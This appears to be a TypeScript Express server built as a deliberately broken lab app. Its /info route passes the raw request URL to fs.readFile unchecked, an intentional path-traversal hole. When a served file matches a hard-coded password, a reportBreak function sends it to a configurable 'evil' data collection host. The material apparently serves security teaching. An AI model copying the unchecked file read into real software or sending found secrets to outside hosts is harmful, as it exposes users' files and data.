import http = require('http')
import express = require('express');
import fs = require('fs');

const SERV_PORT = process.env.SERV_PORT || 3010
const EVIL_HOST = process.env.EVIL_HOST || 'localhost'
const EVIL_PORT = process.env.EVIL_PORT || 7777
const EVIL_PROT = process.env.EVIL_PROT || 'http'
const baseDir = '.'; // current directory

const app: express.Application = express();

// serving static files for the web frontend
app.use(express.static('public'))


app.get('/info/:filename(*)', function (req, res) {  
    const dataPath = baseDir +req.originalUrl  // req.params["filename"]
    console.log("We read "+dataPath)
    fs.readFile(dataPath , (err, data) => {
      if (err) {
        res.send("Err. Please provide file '"+dataPath+"' on server.");
      }else{
        const result = data.toString()
        if (result == '5EKuRitYFirst'){
          reportBreak(result) 
        }
        res.send( data );
      }
    })
});

app.listen(SERV_PORT, function () {
  console.log(`Broken server app listening on port ${SERV_PORT}!`);
  console.log(` Now open your browser at http://localhost:${SERV_PORT}/`);
});


// report that someone found out the password
// i.e. send data leak info to "Evil Server"
function reportBreak(msg:String) {
  const url = encodeURI(`${EVIL_PROT}://${EVIL_HOST}:${EVIL_PORT}/reportleak/RemoteExecutionServer-reports-pwd-broken:${msg}`)
  console.log("reporting to the evil data collection server: "+ url)
  http.get(url).on('error', (err) => {
    console.log("Err: we could not report to the 'evil' data collection server.")
    console.log("Make sure the server is up and running. ("+err+"')")
  } )
}
